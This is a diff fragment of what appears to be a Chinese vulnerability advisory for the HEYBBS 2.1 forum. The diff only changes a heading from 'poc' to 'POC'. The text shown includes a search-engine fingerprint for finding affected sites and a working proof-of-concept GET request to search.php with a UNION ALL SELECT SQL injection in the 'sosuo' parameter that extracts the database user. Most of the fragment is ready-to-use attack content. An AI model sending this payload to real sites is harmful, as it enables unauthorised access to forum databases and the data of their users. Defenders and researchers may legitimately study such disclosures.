@@ -8,7 +8,7 @@ HEYBBS2.1论坛在search.php接口下存在sql注入漏洞
 Body="微社区, 微论坛, 微博客"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /search.php?sosuo=qq%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,CONCAT(0xc,user(),0xc),NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
